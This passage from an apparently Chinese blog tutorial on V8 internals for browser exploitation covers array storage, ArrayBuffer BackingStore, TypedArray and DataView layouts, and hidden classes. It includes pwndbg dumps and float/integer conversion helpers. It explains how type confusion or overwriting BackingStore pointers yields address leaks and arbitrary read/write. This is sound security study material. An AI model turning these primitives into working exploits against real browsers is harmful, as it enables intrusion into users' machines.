class="number">0x8e88570dda9</span>: [<span class="title class_">FixedDoubleArray</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x17eb011814f9</span> &lt;<span class="title class_">Map</span>&gt;</span><br><span class="line"> - <span class="attr">length</span>: <span class="number">2</span></span><br><span class="line">           <span class="number">0</span>: <span class="number">1</span></span><br><span class="line">           <span class="number">1</span>: <span class="number">1.1</span></span><br></pre></td></tr></table></figure></div><blockquote><p>可以看到这里1.1没有用HeapNumber，double值在double array里是直接存的，可以节省内存空间</p></blockquote><p>稍微修改一下变成object array</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">let arr = [<span class="number">1</span>, <span class="number">1.1</span>];</span><br><span class="line">%<span class="built_in">DebugPrint</span>(arr);</span><br><span class="line">%<span class="built_in">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x17dcd1e4ddf9</span> &lt;JSArray[<span class="number">3</span>]&gt;</span><br><span class="line">pwndbg&gt; x/<span class="number">8</span>gx <span class="number">0x17dcd1e4dd99</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x17dcd1e4dd98</span>:<span class="number">0x000004fddb340801</span><span class="number">0x0000000300000000</span></span><br><span class="line"><span class="number">0x17dcd1e4dda8</span>:<span class="number">0x0000000100000000</span>(<span class="number">1</span>)<span class="number">0x00003aaf2dc1f2f9</span>(HeapNumber Pointer)</span><br><span class="line"><span class="number">0x17dcd1e4ddb8</span>:<span class="number">0x000017dcd1e4ddc1</span><span class="number">0x0000376224680459</span></span><br><span class="line"><span class="number">0x17dcd1e4ddc8</span>:<span class="number">0x000004fddb340c71</span><span class="number">0x000004fddb340c71</span></span><br><span class="line">pwndbg&gt; job <span class="number">0x17dcd1e4ddf9</span></span><br><span class="line"><span class="number">0x17dcd1e4ddf9</span>: [JSArray]</span><br><span class="line"> - map: <span class="number">0x376224682f79</span> &lt;<span class="built_in">Map</span>(PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x3aaf2dc11111</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - elements: <span class="number">0x17dcd1e4dd99</span> &lt;FixedArray[<span class="number">3</span>]&gt; [PACKED_ELEMENTS]</span><br><span class="line"> - length: <span class="number">3</span></span><br><span class="line"> - properties: <span class="number">0x04fddb340c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    <span class="meta">#length: 0x2d9d450001a9 <span class="string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: <span class="number">0x17dcd1e4dd99</span> &lt;FixedArray[<span class="number">3</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">1</span></span><br><span class="line">           <span class="number">1</span>: <span class="number">0x3aaf2dc1f2f9</span> &lt;HeapNumber <span class="number">1.1</span>&gt;</span><br><span class="line">           <span class="number">2</span>: <span class="number">0x17dcd1e4ddc1</span> &lt;Object map = <span class="number">0x376224680459</span>&gt;</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; job <span class="number">0x3aaf2dc1f2f9</span></span><br><span class="line"><span class="number">1.1</span></span><br><span class="line">pwndbg&gt; x/<span class="number">2</span>gx <span class="number">0x3aaf2dc1f2f9</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x3aaf2dc1f2f8</span>:<span class="number">0x000004fddb340561</span><span class="number">0x3ff199999999999a</span></span><br></pre></td></tr></table></figure></div><blockquote><p>可以看到这里1.1就变成用HeapNumber了</p><p>💡可以看出double array和object array的存储方式不同，可以利用这个特性，假设有一个double array和object array的类型混淆，使得object array使用double array的方式直接把元素读出来，这样可以leak任意指针的地址&#x2F;伪造任意object</p></blockquote><h3 id="JSArrayBuffer"><a href="#JSArrayBuffer" class="headerlink" title="JSArrayBuffer"></a>JSArrayBuffer</h3><p>保存有⼀个被称作BackingStore的buffer的对象</p><blockquote><p>BackingStore 是一种用于存储数据的独立内存区域，主要用于存放 JavaScript 中 <code>TypedArray</code>、<code>ArrayBuffer</code> 这样的二进制数据。</p><ul><li><strong>不受 GC 管理</strong>：这块内存区域是独立分配的，不会被 V8 的 GC 自动回收,因此向BackingStore的指针不是Tagged Value（末尾不能为1）</li><li>分配方式：<ul><li>在 Chrome 中使用 <strong>PartitionAlloc</strong> 分配。</li><li>在 d8（V8 的独立运行环境）中使用 <strong>ptmalloc</strong>（一个常见的 malloc 实现）模拟分配。</li></ul></li><li><strong>用途</strong>：它是一种高效存储二进制数据的方法，避免了与 GC 交互时的额外开销。</li></ul></blockquote><p>举个例子🌰</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x20</span>);</span><br><span class="line">%<span class="built_in">DebugPrint</span>(buf);</span><br><span class="line">%<span class="built_in">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x3d9ab9b8dd79</span> &lt;ArrayBuffer map = <span class="number">0x2027fb1021b9</span>&gt;</span><br><span class="line">pwndbg&gt; job <span class="number">0x3d9ab9b8dd79</span></span><br><span class="line"><span class="number">0x3d9ab9b8dd79</span>: [JSArrayBuffer]</span><br><span class="line"> - map: <span class="number">0x2027fb1021b9</span> &lt;<span class="built_in">Map</span>(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x28593e5ce981</span> &lt;Object map = <span class="number">0x2027fb102209</span>&gt;</span><br><span class="line"> - elements: <span class="number">0x15b6957c0c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - embedder fields: <span class="number">2</span></span><br><span class="line"> - backing_store: <span class="number">0x559b9dc779f0</span> <span class="comment">//* 不是tagged value</span></span><br><span class="line"> - byte_length: <span class="number">32</span></span><br><span class="line"> - detachable</span><br><span class="line"> - properties: <span class="number">0x15b6957c0c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; &#123;&#125;</span><br><span class="line"> - embedder fields = &#123;</span><br><span class="line">    <span class="number">0</span>, aligned pointer: (nil)</span><br><span class="line">    <span class="number">0</span>, aligned pointer: (nil)</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x559b9dc779f0</span></span><br><span class="line"><span class="number">0x559b9dc779f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x559b9dc77a00</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x559b9dc77a10</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x559b9dc77a20</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000559b9dbef010</span></span><br><span class="line"><span class="number">0x559b9dc77a30</span>:<span class="number">0x3031626637323032</span><span class="number">0x0000003e39303232</span></span><br><span class="line"><span class="number">0x559b9dc77a40</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000003c1</span></span><br><span class="line"><span class="number">0x559b9dc77a50</span>:<span class="number">0x00007f8ec2273be0</span><span class="number">0x00007f8ec2273be0</span></span><br><span class="line"><span class="number">0x559b9dc77a60</span>:<span class="number">0x0000559b694a8081</span><span class="number">0x0000000100440000</span></span><br><span class="line"><span class="number">0x559b9dc77a70</span>:<span class="number">0x0072005000000008</span><span class="number">0x0000559b9dc77a30</span></span><br><span class="line"><span class="number">0x559b9dc77a80</span>:<span class="number">0x0000559b9dc83e80</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x559b9dc779f0</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">0x559b9dc779e0</span>:<span class="number">0x0000082856788f19</span><span class="number">0x0000000000000031</span>  (meta头)</span><br><span class="line"><span class="number">0x559b9dc779f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x559b9dc77a00</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x559b9dc77a10</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x559b9dc77a20</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000559b9dbef010</span></span><br><span class="line"><span class="number">0x559b9dc77a30</span>:<span class="number">0x3031626637323032</span><span class="number">0x0000003e39303232</span></span><br><span class="line"><span class="number">0x559b9dc77a40</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000003c1</span></span><br><span class="line"><span class="number">0x559b9dc77a50</span>:<span class="number">0x00007f8ec2273be0</span><span class="number">0x00007f8ec2273be0</span></span><br><span class="line"><span class="number">0x559b9dc77a60</span>:<span class="number">0x0000559b694a8081</span><span class="number">0x0000000100440000</span></span><br><span class="line"><span class="number">0x559b9dc77a70</span>:<span class="number">0x0072005000000008</span><span class="number">0x0000559b9dc77a30</span></span><br></pre></td></tr></table></figure></div><blockquote><p>带meta头，可见是ptmalloc分配出来的</p><ul><li><strong>虽然在</strong>ArrayBuffer中描述了⼤⼩，但如果将此值重写为较⼤的值，就可以越界读写了。</li><li>同样，可以<strong>重写</strong>BackingStore指针，则可以读取和写⼊任意内存地址</li></ul><p>JSArrayBuffer结构如下</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">    A[&quot;Pointer (63 bit) | 1&quot;] --&gt; B[JSArrayBuffer]</span><br><span class="line">    B --&gt; C[Map*]</span><br><span class="line">    B --&gt; D[Properties*]</span><br><span class="line">    B --&gt; E[Elements*]</span><br><span class="line">    B --&gt; F[ByteLength]</span><br><span class="line">    B --&gt; G[BackingStore*]</span><br><span class="line">    B --&gt; H[BitField]</span><br><span class="line">    G[BackingStore*] --&gt;I1[BackingStore]</span><br></pre></td></tr></table></figure></div></blockquote><h3 id="JSTypedArray"><a href="#JSTypedArray" class="headerlink" title="JSTypedArray"></a>JSTypedArray</h3><p>JSArrayBuffer只是个buffer，在js的设计⾥，对<code>BackStore</code>的读写需要依赖于<code>TypedArray</code>或者<code>DataView</code></p><p>结构如下</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">    A[&quot;Pointer (63 bit) | 1&quot;] --&gt;B1[JSTypedArray]</span><br><span class="line">    B1[JSTypedArray]--&gt;B2[Map*]</span><br><span class="line">    B1[JSTypedArray]--&gt;B3[Properties*]</span><br><span class="line">    B1[JSTypedArray]--&gt;B4[Elements*]</span><br><span class="line">     B1[JSTypedArray]--&gt;B5[Buffer*]</span><br><span class="line">     B1[JSTypedArray]--&gt;B6[BufferOffset]</span><br><span class="line">       B1[JSTypedArray]--&gt;B7[ByteLength]</span><br><span class="line">      B1[JSTypedArray]--&gt;B8[Length]</span><br><span class="line">      B1[JSTypedArray]--&gt;B9[ExternalPointer*]</span><br><span class="line">      B1[JSTypedArray]--&gt;B10[BasePointer*]</span><br><span class="line">    B5[Buffer*]--&gt; B[JSArrayBuffer]</span><br><span class="line">    B --&gt; C[Map*]</span><br><span class="line">    B --&gt; D[Properties*]</span><br><span class="line">    B --&gt; E[Elements*]</span><br><span class="line">    B --&gt; F[ByteLength]</span><br><span class="line">    B --&gt; G[BackingStore*]</span><br><span class="line">    B --&gt; H[BitField]</span><br><span class="line">    G[BackingStore*] --&gt;I1[BackingStore]</span><br></pre></td></tr></table></figure></div><blockquote><p><code>JSTypedArray</code>在漏洞利⽤中的⼀种常⻅⽤途，由于两个不同的<code>TypedArray</code>可以共享同样的<code>ArrayBuffer</code>，所以实际上如果我们⽤⼀个<code>Float64Array</code>去向<code>ArrayBuffer</code>⾥写⼊⼀个double值（8字节），然后⽤<code>Uint32Array</code>读取出来，就可以读出两个4字节的unsigned integer，并拼凑成8字节的unsigned integer，这样就实现了double到整形的转换；同理，可以反过来这样将⼀个整形转换为double</p><p>💡由于js对浮点数的精度问题，对于⼤于 2^53-1 的数据，这样转换可能会造成细微的偏差</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">const</span> f64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">const</span> u32 = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(buf);</span><br><span class="line"><span class="comment">//f64和u32共享同一个ArrayBuffer</span></span><br><span class="line"><span class="comment">// Floating point to 64-bit unsigned integer</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">val</span>) &#123;</span><br><span class="line">  f64[<span class="number">0</span>] = val;</span><br><span class="line">  <span class="keyword">let</span> tmp = <span class="title class_">Array</span>.<span class="title function_">from</span>(u32);</span><br><span class="line">  <span class="keyword">return</span> tmp[<span class="number">1</span>] * <span class="number">0x100000000</span> + tmp[<span class="number">0</span>]; <span class="comment">//&lt;&lt;4</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64-bit unsigned integer to Floating point</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">val</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> tmp = [];</span><br><span class="line">  tmp[<span class="number">0</span>] = <span class="built_in">parseInt</span>(val % <span class="number">0x100000000</span>);</span><br><span class="line">  tmp[<span class="number">1</span>] = <span class="built_in">parseInt</span>((val - tmp[<span class="number">0</span>]) / <span class="number">0x100000000</span>); </span><br><span class="line">  u32.<span class="title function_">set</span>(tmp);</span><br><span class="line">  <span class="keyword">return</span> f64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">i</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + i.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>,<span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">hex</span>(<span class="title function_">d2u</span>(<span class="number">1.1</span>)));</span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">u2d</span>(<span class="number">0x3ff199999999999a</span>));</span><br><span class="line">----&gt;</span><br><span class="line"><span class="number">0x3ff1999999999a00</span></span><br><span class="line"><span class="number">1.1000000000000227</span></span><br></pre></td></tr></table></figure></div></blockquote><h3 id="JSDataView"><a href="#JSDataView" class="headerlink" title="JSDataView"></a>JSDataView</h3><p>也是⽤来读写ArrayBuffer的BackingStore的内容的对象，常⽤于最后的任意地址读写原语的构造</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">    A[&quot;Pointer (63 bit) | 1&quot;] --&gt;B1[JSDataView]</span><br><span class="line">    B1--&gt;B2[Map*]</span><br><span class="line">    B1--&gt;B3[Properties*]</span><br><span class="line">    B1--&gt;B4[Elements*]</span><br><span class="line">     B1--&gt;B5[Buffer*]</span><br><span class="line">     B1--&gt;B6[BufferOffset]</span><br><span class="line">       B1--&gt;B7[ByteLength]</span><br><span class="line">      B1--&gt;B10[DataPointer*]</span><br><span class="line">    B5[Buffer*]--&gt; B[JSArrayBuffer]</span><br><span class="line">    B --&gt; C[Map*]</span><br><span class="line">    B --&gt; D[Properties*]</span><br><span class="line">    B --&gt; E[Elements*]</span><br><span class="line">    B --&gt; F[ByteLength]</span><br><span class="line">    B --&gt; G[BackingStore*]</span><br><span class="line">    B --&gt; H[BitField]</span><br><span class="line">    G[BackingStore*] --&gt;I1[BackingStore]</span><br></pre></td></tr></table></figure></div><h2 id="0x04-V8特性"><a href="#0x04-V8特性" class="headerlink" title="0x04 V8特性"></a>0x04 V8特性</h2><h3 id="Hidden-Class"><a href="#Hidden-Class" class="headerlink" title="Hidden Class"></a>Hidden Class</h3><p>从一个最简单的对象开始分析</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;<span class="attr">a</span>: <span class="string">&quot;foo&quot;</span>, <span class="attr">b</span>: <span class="string">&quot;bar&quot;</span>&#125;;</span><br></pre></td></tr></table></figure></div><ul><li>a和b叫命名属性(name properties，后面简称为property)，没有任何整数索引<ul><li>整数索引，数组 <code>[&quot;foo&quot;,&quot;bar&quot;]</code>有两个整数索引属性：0，值为“foo”，1，值为“bar”。整数索引属性也叫元素element</li></ul></li></ul><p>在JS Object的结构中，element和property存储在两个独⽴的FixedArray中</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/image-20241115181225550.png"                      alt="image-20241115181225550"                ><figcaption>image-20241115181225550</figcaption></figure></p><blockquote><p>elements的key就是在Object的属性数组中的对应位置的索引</p><p>而property的key通常是字符串，无法简单地通过key来判断某个property在属性数组中的对应位置</p><p>💡Tips：在js中，以下两个obj的属性数组不同，即属性结构不同</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj1= &#123;<span class="attr">a</span>: <span class="string">&quot;foo&quot;</span>, <span class="attr">b</span>: <span class="string">&quot;bar&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> obj2= &#123;<span class="attr">b</span>: <span class="string">&quot;bar&quot;</span>, <span class="attr">a</span>: <span class="string">&quot;foo&quot;</span>&#125;;</span><br></pre></td></tr></table></figure></div></blockquote><p>🤔那么怎么解决property位置的问题？V8中使用<code>Hidden Class</code>来描述，每个js Object都有关联的<code>Hidden Class</code>，也就是之前画的HeapObject结构中排第一个的<code>Map*</code></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/image-20241115181237410.png"                      alt="image-20241115181237410"                ><figcaption>image-20241115181237410</figcaption></figure></p><p>HiddenClasses的基本假设：具有相同属性结构的对象共享同一个HiddenClass</p><p>举个例子🌰</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;<span class="attr">a</span>: <span class="string">&quot;foo&quot;</span>,<span class="attr">b</span>:<span class="string">&quot;bar&quot;</span>&#125;;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o1);</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="string">&quot;foo1&quot;</span>,<span class="attr">b</span>:<span class="string">&quot;bar2&quot;</span>&#125;;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o2);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x296e53ccdda1</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x14378b9cab89</span>&gt;</span><br><span class="line"><span class="number">0x296e53ccde41</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x14378b9cab89</span>&gt;</span><br></pre></td></tr></table></figure></div><blockquote><p>可以看到map是相同的</p></blockquote><p>再看一下连续添加属性的过程中map的变化</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;<span class="attr">a</span>: <span class="string">&quot;foo&quot;</span>&#125;;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o1);</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="string">&quot;foo1&quot;</span>&#125;;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o2);</span><br><span class="line">o1.<span class="property">b</span> = <span class="string">&quot;bar&quot;</span>;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o1);</span><br><span class="line">o2.<span class="property">d</span> = <span class="string">&quot;bar2&quot;</span>;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o2);</span><br><span class="line">o1.<span class="property">c</span> = <span class="string">&quot;baz&quot;</span>;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o1);</span><br><span class="line">o2.<span class="property">c</span> = <span class="string">&quot;baz2&quot;</span>;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o2);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x2d3b7204de11</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x218575f4ab39</span>&gt;</span><br><span class="line"><span class="number">0x2d3b7204de61</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x218575f4ab39</span>&gt;</span><br><span class="line"><span class="number">0x2d3b7204de11</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x218575f4ab89</span>&gt;</span><br><span class="line"><span class="number">0x2d3b7204de61</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x218575f4abd9</span>&gt;</span><br><span class="line"><span class="number">0x2d3b7204de11</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x218575f4ac29</span>&gt;</span><br><span class="line"><span class="number">0x2d3b7204de61</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x218575f4ac79</span>&gt;</span><br><span class="line">  </span><br><span class="line">pwndbg&gt; job <span class="number">0x218575f4ab39</span> <span class="comment">//看看HC1</span></span><br><span class="line"><span class="number">0x218575f4ab39</span>: [<span class="title class_">Map</span>]</span><br><span class="line"> - <span class="attr">type</span>: <span class="variable constant_">JS_OBJECT_TYPE</span></span><br><span class="line"> - instance <span class="attr">size</span>: <span class="number">32</span></span><br><span class="line"> - inobject <span class="attr">properties</span>: <span class="number">1</span></span><br><span class="line"> - elements <span class="attr">kind</span>: <span class="variable constant_">HOLEY_ELEMENTS</span></span><br><span class="line"> - unused property <span class="attr">fields</span>: <span class="number">0</span></span><br><span class="line"> - enum <span class="attr">length</span>: invalid</span><br><span class="line"> - back <span class="attr">pointer</span>: <span class="number">0x218575f4aae9</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">HOLEY_ELEMENTS</span>)&gt;</span><br><span class="line"> - prototype_validity <span class="attr">cell</span>: <span class="number">0x2379e4b40609</span> &lt;<span class="title class_">Cell</span> value= <span class="number">1</span>&gt;</span><br><span class="line"> - instance descriptors #<span class="number">1</span>: <span class="number">0x2d3b7204df61</span> &lt;<span class="title class_">DescriptorArray</span>[<span class="number">3</span>]&gt;</span><br><span class="line"> - layout <span class="attr">descriptor</span>: (nil)</span><br><span class="line"> - transitions #<span class="number">2</span>: <span class="number">0x39b2971dfa91</span> &lt;<span class="title class_">TransitionArray</span>[<span class="number">6</span>]&gt;<span class="title class_">Transition</span> array #<span class="number">2</span>: <span class="comment">//v8维护的transition tree</span></span><br><span class="line">     #<span class="attr">b</span>: (transition <span class="title function_">to</span> (<span class="keyword">const</span> data field, <span class="attr">attrs</span>: [<span class="variable constant_">WEC</span>]) @ <span class="title class_">Any</span>) -&gt; <span class="number">0x218575f4ab89</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">HOLEY_ELEMENTS</span>)&gt; <span class="comment">//属性为a,b的map</span></span><br><span class="line">     #<span class="attr">d</span>: (transition <span class="title function_">to</span> (<span class="keyword">const</span> data field, <span class="attr">attrs</span>: [<span class="variable constant_">WEC</span>]) @ <span class="title class_">Any</span>) -&gt; <span class="number">0x218575f4abd9</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">HOLEY_ELEMENTS</span>)&gt; <span class="comment">//属性为a,d的map</span></span><br><span class="line"></span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x39b2971c2091</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x218575f40229</span>&gt;</span><br><span class="line"> - <span class="attr">constructor</span>: <span class="number">0x39b2971c20c9</span> &lt;<span class="title class_">JSFunction</span> <span class="title class_">Object</span> (sfi = <span class="number">0x2379e4b457e9</span>)&gt;</span><br><span class="line"> - dependent <span class="attr">code</span>: <span class="number">0x1a62eb8002c1</span> &lt;<span class="title class_">Other</span> heap <span class="title function_">object</span> (<span class="variable constant_">WEAK_FIXED_ARRAY_TYPE</span>)&gt;</span><br><span class="line"> - construction <span class="attr">counter</span>: <span class="number">0</span></span><br></pre></td></tr></table></figure></div><p>可以用以下流程图（也表示transition tree结构）来表示map(HiddenClass)的变化</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">    A[HC 0] --&gt;|&quot;Add &#x27;a&#x27;&quot;| B[HC 1]</span><br><span class="line">    B --&gt;|&quot;Add &#x27;b&#x27;&quot;| C[HC 2]</span><br><span class="line">    C --&gt;|&quot;Add 